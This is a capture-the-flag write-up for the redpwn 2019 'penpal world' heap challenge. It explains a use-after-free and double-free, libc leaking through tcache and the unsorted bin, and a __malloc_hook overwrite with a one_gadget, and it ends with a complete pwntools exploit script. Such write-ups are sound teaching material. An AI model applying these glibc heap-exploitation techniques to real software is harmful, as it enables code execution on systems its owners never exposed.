# penpal world

## Pwn - Points: 436

> Written by: jespiron
>
> 
>
> Please don't decimate this cute lil ish; write your grandmother a smol parcel of love instead~
>
> 
>
> `nc chall2.2019.redpwn.net 4010`
>
> [libc-2.27.so](libc-2.27.so)
>
> [penpal_world](penpal_world)
>

The given binary has all typical security mechanisms enabled:

	$ checksec penpal_world
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

It seems to be a typical heap challenge with a menu, that provides various options, basically `malloc`, `free`, `read` and `write`. Since no source code is provided, we have to decompile and analyze the binary with `Ghidra`. Then we can see, that the `free` operation does not nullify the pointer, so we can access the memory later on and have a `use-after-free` vulnerability. Secondly we can `free` the same memory multiple times, so we have also a `double-free` vulnerability.

To exploit this, we have to leak the `libc` base address and find a way to execute `one_gadget`. This can typically be achieved by setting up a `malloc_hook`. The binary does only `malloc` chunks of size `0x48`, that is in fastbin range, that do not store a pointer to `libc`, so we have to increase the chunk size. Also, we are given a `libc-2.27.so`, so we have to take in mind, that it uses `tcache`.

To leak a chunk address on the heap, we `malloc` a chunk and `free` it twice. Then the `fd` pointer, that is stored inside the memory region of the user data contains the address of the chuck itself, so we can leak its address by reading it out.

Then we add an offset to the address to point to the chunk header of the following chunk. Then we `malloc` a new chunk and we will get the previously freed chunk back. The next `malloc` will allocate a chunk which controls the chunk header of the following chunk. Then we allocate a new chunk, that will be placed after the previous chunk. Since we have control of the chunk header, we can increase the chunk size and set it above fastbin size. Then we do something called tcache-poisoning: we `free` the new chunk 7 times and will fill up the `tcache`, so that the 8th `free` will add the chunk to the unsorted bins. The first chunk in the unsorted bins stores in the `fd` pointer to the address of `main_arena` of `libc`, that we can now read out and calculate the address of `one_gadget`.

Now we `malloc` a new chunk and `free` it again and leverage `use-after-free` to modify the `fd` pointer to point to the fake chunk `malloc_hook-0x23`. Then we `malloc` again and get the freed chunk back and the next `malloc` will give us the fake chunk and we overwrite the `__malloc_hook` with `one_gadget`. The next `malloc` will spawn the shell.

Exploit code:

```python
from pwn import *


libc = ELF('./libc-2.27.so')

def malloc(n):
	p.sendline('1')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('4) Read a postcard\n')

def free(n):
	p.sendline('3')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('4) Read a postcard\n')

def write(n, payload):
	p.sendline('2')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('Write.\n')
	p.sendline(payload)
	p.recvuntil('4) Read a postcard\n')

def read(n):
    p.sendline('4')
    p.recvuntil('Which envelope #?\n')
    p.sendline(str(n))

# context.terminal = ['termite', '-e']
# p = gdb.debug('./penpal_world')
p = process('./penpal_world')

p.recvuntil('4) Read a postcard\n')

# malloc chunk
malloc(0)

# double free
free(0)
free(0)

# leak heap address that is now stored in fd pointer in chunk user data
read(0)

heap_leak = u64(p.recv(6) + '\x00\x00')
log.success('heap: {}'.format(hex(heap_leak)))

p.recvuntil('4) Read a postcard\n')

# setup arbitrary write into chunk header of following chunk by modifying fd
write(0, p64(heap_leak + 0x40))

# initial chunk
malloc(0)

# allocation of chunk header
malloc(1)

# allocation of new chunk
malloc(0)

# modify chunk size in chunk header
write(1, p64(0x0) + p64(0x91))

# bypass: double free or corruption (!prev)
malloc(1)
write(1, 'A' * 0x30 + p64(0x0) + p64(0x51))

# bypass: corrupted size vs. prev_size
malloc(1)
write(1, 'A' * 0x30 + p64(0x0) + p64(0x51))

# tcache poisoning
# fill the tcache with 7 free chunks
# the 8th chunk will go into the unsorted bin
for i in range(8):
	free(0)

# leak libc address by reading the fd pointer that points to libc main_arena
read(0)
libc_leak = u64(p.recv(6) + '\x00\x00')

libc_base = libc_leak - 0x3EBCA0
log.success('libc base: {}'.format(hex(libc_base)))

malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x10a38c

# allocate chunk
malloc(0)

# use-after-free
free(0)

# modify fd to point to fake chunk malloc_hook-0x23
write(0, p64(malloc_hook-0x23))

# malloc chunk again
malloc(0)

# malloc the fake chunk
malloc(0)

# overwrite __malloc_hook with one_gadget 
write(0, 'A' * 0x23 + p64(one_gadget))

# malloc something to trigger shell
p.sendline('1\n0')
p.interactive()
```